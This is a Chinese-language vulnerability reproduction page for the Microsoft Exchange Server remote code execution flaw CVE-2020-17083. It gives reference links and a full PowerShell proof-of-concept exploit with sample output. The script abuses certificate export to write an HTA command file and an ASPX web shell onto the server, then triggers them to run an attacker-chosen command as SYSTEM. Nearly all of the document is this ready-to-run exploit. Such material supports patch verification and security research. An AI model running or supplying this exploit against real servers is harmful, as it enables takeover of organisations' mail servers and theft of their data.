# Microsoft Exchange Server 远程执行代码漏洞 CVE-2020-17083 

## 漏洞描述

参考链接：

- https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17083
- https://srcincite.io/pocs/cve-2020-17083.ps1.txt

## 漏洞复现

poc：

```
# Microsoft Exchange Server ExportExchangeCertificate WriteCertiricate File Write Remote Code Execution Vulnerability
# Patch: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17083
# CVSS v3: 9.1 (/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C)
# 
# Notes:
#
# The (ab)user needs the "Exchange Server Certificates" role assigned
# [PS] C:\Windows\system32>New-RoleGroup -Name "cert users" -Roles "Exchange Server Certificates" -Members "harryh"
# 
# Name       AssignedRoles                  RoleAssignments                           ManagedBy
# ----       -------------                  ---------------                           ---------
# cert users {Exchange Server Certificates} {Exchange Server Certificates-cert users} {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/Admin}
# 
#
# [PS] C:\Windows\system32>Get-RoleGroup "cert users" | Format-List
#
#
# RunspaceId                  : a97d7e2c-d036-4bfc-b95c-4fabcb644160
# ManagedBy                   : {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/Admin}
# RoleAssignments             : {Exchange Server Certificates-cert users}
# Roles                       : {Exchange Server Certificates}
# DisplayName                 :
# ExternalDirectoryObjectId   :
# Members                     : {exchangedemo.com/Users/Harry Houdini}
# SamAccountName              : cert users
# Description                 :
# RoleGroupType               : Standard
# LinkedGroup                 :
# Capabilities                : {}
# LinkedPartnerGroupId        :
# LinkedPartnerOrganizationId :
# Identity                    : exchangedemo.com/Microsoft Exchange Security Groups/cert users
# IsValid                     : True
# ExchangeVersion             : 0.10 (14.0.100.0)
# Name                        : cert users
# DistinguishedName           : CN=cert users,OU=Microsoft Exchange Security Groups,DC=exchangedemo,DC=com
# Guid                        : 6fb0b860-2cc2-4fe1-9489-d93dbbed8c9f
# ObjectCategory              : exchangedemo.com/Configuration/Schema/Group
# ObjectClass                 : {top, group}
# WhenChanged                 : 6/12/2020 4:15:54 AM
# WhenCreated                 : 6/12/2020 1:34:51 AM
# WhenChangedUTC              : 6/11/2020 8:15:54 PM
# WhenCreatedUTC              : 6/11/2020 5:34:51 PM
# OrganizationId              :
# Id                          : exchangedemo.com/Microsoft Exchange Security Groups/cert users
# OriginatingServer           : DEAD01.exchangedemo.com
# ObjectState                 : Changed
#
# Example:
#
# PS C:\Users\researcher> .\poc.ps1 -server WIN-0K4AOM2JIN6.exchangedemo.com -usr harryh@exchangedemo.com -pwd user123### -cmd mspaint
# (+) targeting WIN-0K4AOM2JIN6.exchangedemo.com with harryh@exchangedemo.com:user123###
# (+) wrote to target file C:/Windows/Temp/rXq1U2tD.hta
# (+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/4VFQwc7W.aspx
# (+) shell written, executing command...
# (+) executed mspaint as SYSTEM!
# PS C:\Users\researcher>

param (
    [Parameter(Mandatory=$true)][string]$server,
    [Parameter(Mandatory=$true)][string]$usr,
    [Parameter(Mandatory=$true)][string]$pwd,
    [string]$cmd = "mspaint"
)
 
Function Get-RandomAlphanumericString {
    [CmdletBinding()]
    Param (
        [int] $length = 8
    )
    Process{
        Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length  | % {[char]$_}) )
    }    
}

function Writebad-File{
    Param (
        [string] $fn,
        [string] $content,
        [System.Management.Automation.Runspaces.PSSession] $session
    )
    $selector = Get-RandomAlphanumericString
    Invoke-Command -Session $session -ScriptBlock {
        New-ExchangeCertificate -BinaryEncoded -GenerateRequest -SubjectName "c=$Using:selector,o=$Using:content,cn=si"
    } | Out-Null
    $thumb = Invoke-Command -Session $session -ScriptBlock {
         Get-ExchangeCertificate 
    } | Where-Object -Property Subject -like "*c=$selector*" | select-object -Expand Thumbprint

    # this is where the file write is for this bug
    Invoke-Command -Session $session -ScriptBlock {
         Export-ExchangeCertificate -Thumbprint $Using:thumb -FileName $Using:fn -BinaryEncoded;
    } | Out-Null
}
function Exploit-Exchange {
    Param (
        [string] $server,
        [string] $usr,
        [string] $pwd,
        [string] $cmd
    )
    "(+) targeting $server with ${usr}:$pwd"
    $securepwd = ConvertTo-SecureString $pwd -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($usr, $securepwd)
    $s = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://$server/PowerShell/ -Authentication Kerberos -Credential $creds
    $hta = Get-RandomAlphanumericString
    $aspx = Get-RandomAlphanumericString
    
    # write a hta file with commands
    Writebad-File -fn "C:/Windows/Temp/$hta.hta" -content "<script>new ActiveXObject('WScript.Shell').Exec('cmd /c $cmd')</script>" -session $s
    "(+) wrote to target file C:/Windows/Temp/$hta.hta" 
    
    # write aspx file
    Writebad-File -fn "C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/$aspx.aspx" -content "<%=System.Diagnostics.Process.Start(Request[Request.HttpMethod])%>" -session $s
    "(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/$aspx.aspx" 
    "(+) shell written, executing command..."
    $b = @{
        destination = "https://$server/ecp/$aspx.aspx?GET=C:/Windows/Temp/$hta.hta"
        flags = ''
        username = $usr
        password = $pwd
    }
    $r = Invoke-WebRequest "https://$server/owa/auth.owa" -SessionVariable 'websess' -Body $b -Method 'POST' | Select-Object -Expand Forms
    if ([string]::IsNullOrWhiteSpace($r)) {
        "(+) executed $cmd as SYSTEM!"
    } else {
        "(-) exploit failed"
    }    
}

Get-PSSession | Remove-PSSession
Exploit-Exchange -server $server -usr $usr -pwd $pwd -cmd $cmd
```

